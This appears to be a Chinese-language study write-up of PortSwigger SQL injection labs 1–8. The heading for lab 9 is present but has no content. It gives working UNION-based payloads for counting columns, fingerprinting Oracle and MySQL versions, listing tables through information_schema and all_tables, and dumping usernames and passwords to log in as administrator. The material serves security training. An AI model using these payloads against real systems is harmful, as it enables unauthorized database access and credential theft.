## SQL-Injection

[TOC]

#### [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

#### 1. SQL injection UNION attack, determining the number of columns returned by the query

先用`order by`测出来列数是3。

然后用`union select 1,2,3`啥都出不来。

我的payload是：`/filter?category=' union select 1,2,3--`。

因为啥都不出来，直接报错，我就去看了一下官方给的payload：`/filter?category=' union select null,null,null--`

还能这样？最后一个一个的试才发现，1和2的位置填数字会报错，3的位置可以填。但是填`null`是比较稳妥的方案。

#### 2. SQL injection UNION attack, finding a column containing text

还是先用`order by`测出来列数是3。

经过测试：`/filter?category=' union select 1,'sss',3--`

![2.1](sql-injection-burp.assets/2.1.png)

已经找到包含文本的列：第二列。

但是不给过。

居然要输入他给的字符串：`' union select 1,'VaRkKi',3--`

#### 3. SQL injection UNION attack, retrieving data from other tables

题目要求：

> The database contains a different table called `users`, with columns called `username` and `password`.
>
> To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

用`order by`测出来有两列。

payload:`/filter?category=%27%20union%20select%20username,password%20from%20users--`

#### 4. SQL injection UNION attack, retrieving multiple values in a single column

1. 找出列数。
2. 找出哪一列可以用
3. concat或者用`||`连接。

payload:

1. `/filter?category=' union select null,concat(username,password) from users--`
2. `/filter?category=' union select null,username||'~'||password from users--`

#### 5. SQL injection attack, querying the database type and version on Oracle

> 在Oracle数据库上，每个`SELECT`语句都必须指定要选择的表`FROM`。如果您的`UNION SELECT`攻击没有从表中查询，您仍然需要在`FROM`关键字后面加上有效的表名。Oracle上有一个内置表称为DUAL，您可以将其用于此目的。例如：`UNION SELECT 'abc' FROM DUAL`

已经提示了使用的Oracle数据库。

题目要求：

```
Make the database retrieve the strings: 
'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production'
```

payload：`/filter?category=' union select null,banner from v$version--`

`banner`在sheet里面去找。

#### 6. SQL injection attack, querying the database type and version on MySQL and Microsoft

这道题不知道是啥问题，一直不行，状态码一直是500。后面来做吧。

我觉得payload大概率就是：`' union select null,@@version--`

官方的payload：`'+UNION+SELECT+@@version,+NULL#`

#### 7. SQL injection attack, listing the database contents on non-Oracle databases

先用order by得到列数是2。

`category='+order+by+2--`

经过测试，发现两列都能用。

`category='+union+select+'abc','def'--`

查找表名：

`category=%27+union+select+table_name,null+from+information_schema.tables--`

查找列名：

`category=%27+union+select+column_name,null+from+information_schema.columns+where+table_name='users_hgcvqp'--`

查找信息：

`category=%27+union+select+username_jjuqsb,password_pygkri+from+users_hgcvqp--`

最后登录administrator。

#### 8. SQL injection attack, listing the database contents on Oracle

Oracle数据库的结构不一样。

> cheat sheet里得到的信息：
> SELECT * FROM all_tables
> SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'

用order by测得列数为2。

查找表名：

`category=%27+union+select+table_name,null+from+all_tables--`

查找列名：

`category=%27+union+select+column_name,null+from+all_tab_columns+where+table_name='USERS_SDGZSD'--`

查找信息：

`category=%27+union+select+USERNAME_XLKHFA,PASSWORD_CUQKST+from+USERS_SDGZSD--`

最后登录administrator。

#### 9. Blind SQL injection with conditional responses

